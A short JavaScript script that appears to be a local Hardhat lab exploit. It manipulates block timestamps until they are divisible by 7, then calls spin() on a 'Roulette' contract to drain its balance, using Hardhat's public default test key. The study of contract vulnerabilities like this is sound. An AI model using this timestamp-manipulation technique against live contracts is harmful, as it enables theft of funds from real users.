const help = require("@nomicfoundation/hardhat-network-helpers");
const fs = require("fs")
const path = require("path")
const {ethers} = require("ethers");
async function get() {

    const url = "http://127.0.0.1:8545/";
    const privateKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
    const contractAddress = "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512";
    const provider = new ethers.providers.JsonRpcProvider();
    const wallet = new ethers.Wallet(privateKey, provider);
    console.log("wallet-->" + wallet.address);
    const balance = await wallet.getBalance();
    console.log("balance-->" + balance);

    //获取合约abi
    const abi = getTheAbi();

    //生成合约变量
    const roulette = new ethers.Contract(contractAddress, abi, wallet);
    //查看合约余额
    const contractBalance = await provider.getBalance(contractAddress);
    console.log("contractBalance-->" + contractBalance);
    //查看当前区块的时间戳
    let blockInfo = await provider.getBlock("latest");

    console.log("blockTimeStamp-->" + blockInfo.timestamp)
    //查看时间戳是否能被7取余
    console.log(blockInfo.timestamp % 7);

    //修改区块时间戳
    while (blockInfo.timestamp % 7 !== 0) {
        await provider.send('evm_increaseTime', [70000]);
        await provider.send('evm_mine');
        blockInfo = await provider.getBlock("latest")
        console.log("timestamp-->"+ blockInfo.timestamp);
        console.log("number-->" + blockInfo.number);
        console.log(JSON.stringify(blockInfo))
    }

    //调用合约函数
    const sendEth = ethers.utils.parseEther("1");
    const tx = await roulette.spin({value: sendEth, gasLimit: 31065});
    let newVar = await tx.wait();
    console.log(tx)
    console.log(newVar)
    //查看合约钱包中的余额是否被取走
    const contractNewBalance = await provider.getBalance("0xe7f1725e7734ce288f8367e1bb143e90bb3f0512");
    console.log("contractNewBalance-->" + contractNewBalance);
}


const getTheAbi = () => {
    try {
        const dir = path.resolve(
            __dirname,
            "/Users/jackchen/webstorm-project/timestamp/artifacts/contracts/Roulette.sol/Roulette.json"
        )
        const file = fs.readFileSync(dir, "utf8")
        const json = JSON.parse(file)
        const abi = json.abi
        console.log(`abi`, abi)

        return abi
    } catch (e) {
        console.log(`e`, e)
    }
}

get().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});